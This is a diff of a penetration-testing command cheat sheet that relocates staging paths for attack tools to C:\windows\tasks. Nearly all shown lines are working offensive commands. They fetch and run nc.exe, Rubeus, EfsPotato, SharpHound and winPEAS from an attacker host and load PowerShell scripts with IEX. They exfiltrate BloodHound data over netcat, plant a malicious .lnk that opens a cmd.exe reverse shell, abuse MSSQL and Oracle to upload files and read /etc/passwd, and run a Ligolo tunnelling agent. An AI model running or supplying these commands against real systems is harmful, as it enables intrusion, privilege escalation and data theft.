@@ -859,10 +859,10 @@ wget https://github.com/DaddyBigFish/mssqlproxy/releases/download/dlls/Microsoft
 wget https://github.com/DaddyBigFish/mssqlproxy/releases/download/dlls/reciclador.dll
 python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
 enable_ole
-upload reciclador.dll C:\programdata\reciclador.dll
+upload reciclador.dll C:\windows\tasks\reciclador.dll
 exit
-python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET -check -reciclador 'C:\programdata\reciclador.dll'
-python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET -start -reciclador 'C:\programdata\reciclador.dll'
+python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET -check -reciclador 'C:\windows\tasks\reciclador.dll'
+python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET -start -reciclador 'C:\windows\tasks\reciclador.dll'
 echo 'socks5  127.0.0.1 1337' | sudo tee -a /etc/proxychains.conf
 proxychains4 evil-winrm -i 127.0.0.1 -u $USERNAME -p $PASSWORD
 
@@ -894,7 +894,7 @@ sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getF
 sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output; cat output
 
 +---------- Upload Files ----------+
-sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --putFile 'C:\ProgramData\' '' upload.file
+sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --putFile 'C:\windows\tasks\' '' upload.file
 
 [*] (2049) NFS
 +---------- List Mounts ----------+
@@ -1306,21 +1306,21 @@ python3 -m http.server 80 /Upload
 impacket-smbserver share /Upload/windows
 
 -->> Transfer From Linux
-curl $MYIP/windows/nc.exe -o \programdata\nc.exe
-curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe
-curl $MYIP/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
-curl $MYIP/windows/Rubeus.exe -o \programdata\Rubeus.exe
-curl $MYIP/windows/agent.exe -o \programdata\agent.exe
-curl $MYIP/windows/PowerView.ps1 -o \programdata\PowerView.ps1
-curl $MYIP/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
-curl $MYIP/bat2exe.bat -o \programdata\bat2exe.bat
-wget $MYIP/windows/nc.exe -o \programdata\nc.exe
+curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
+curl $MYIP/windows/Sharphound.exe -o \windows\tasks\Sharphound.exe
+curl $MYIP/windows/EfsPotato.exe -o \windows\tasks\EfsPotato.exe
+curl $MYIP/windows/Rubeus.exe -o \windows\tasks\Rubeus.exe
+curl $MYIP/windows/agent.exe -o \windows\tasks\agent.exe
+curl $MYIP/windows/PowerView.ps1 -o \windows\tasks\PowerView.ps1
+curl $MYIP/windows/PrivescCheck.ps1 -o \windows\tasks\PrivescCheck.ps1
+curl $MYIP/bat2exe.bat -o \windows\tasks\bat2exe.bat
+wget $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
 copy \\$MYIP\$\nc.exe \programdata
-certutil -urlcache -f http://$MYIP/windows/nc.exe \programdata\nc.exe
+certutil -urlcache -f http://$MYIP/windows/nc.exe \windows\tasks\nc.exe
 
 -->> Transfer To Linux
-curl $MYIP/windows/nc.exe -o \programdata\nc.exe
-\programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
+curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
+\windows\tasks\nc.exe $MYIP 80 < \windows\tasks\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 
 [*] Persistence
@@ -1332,16 +1332,16 @@ sprayme 'dbf:123qweasdF!' hosts
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-powershell -c "curl $MYIP/windows/winPEASofs.exe -o \programdata\winPEASofs.exe; \programdata\winPEASofs.exe"
+powershell -c "curl $MYIP/windows/winPEASofs.exe -o \windows\tasks\winPEASofs.exe; \windows\tasks\winPEASofs.exe"
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/PrivescCheck.ps1');Invoke-PrivescCheck
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/whoami')
 //$MYIP/$/winPEASofs.exe > //$MYIP/$/output_winPEAS.txt
 tail -f /Upload/windows/output_winPEAS.txt
 
 +---------- Sharphound Data ----------+
-curl $MYIP/windows/Sharphound.exe -o \programdata\Sharphound.exe; \programdata\Sharphound.exe
-curl $MYIP/windows/nc.exe -o \programdata\nc.exe
-\programdata\nc.exe $MYIP 80 < \programdata\BloodHound.zip
+curl $MYIP/windows/Sharphound.exe -o \windows\tasks\Sharphound.exe; \windows\tasks\Sharphound.exe
+curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
+\windows\tasks\nc.exe $MYIP 80 < \windows\tasks\BloodHound.zip
 rlwrap nc -lvp 80 > /Upload/bloodhound/files.zip
 cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | tee usernames_$DC
 cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
@@ -1416,8 +1416,8 @@ nxc winrm 192.168.110.51-56 -u usernames -H hashes --local-auth
 nxc smb 192.168.110.51-56 -u usernames -H hashes --local-auth --shares
 
 +---------- Malicious .lnk ----------+
-curl $MYIP/windows/nc.exe -o \programdata\nc.exe
-powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\programdata\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
+curl $MYIP/windows/nc.exe -o \windows\tasks\nc.exe
+powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\windows\tasks\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; $sc.Arguments = '\\$TARGET\\x'; $sc.Save()"
 
 +---------- Enumerate Certificate Services ----------+
@@ -1522,7 +1522,7 @@ ipcalc 172.16.1.0/255.255.255.0
 ## Ligolo: Setup
 sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
 curl $MYIP/linux/agent -o /dev/shm/agent; chmod +x /dev/shm/agent; /dev/shm/agent -ignore-cert -connect $MYIP:8080
-curl $MYIP/windows/agent.exe -o \programdata\agent.exe && C:\programdata\agent.exe -ignore-cert -connect $MYIP:8080
+curl $MYIP/windows/agent.exe -o \windows\tasks\agent.exe && C:\windows\tasks\agent.exe -ignore-cert -connect $MYIP:8080
 session 1
 interface_create --name ligolo
 tunnel_start --tun ligolo
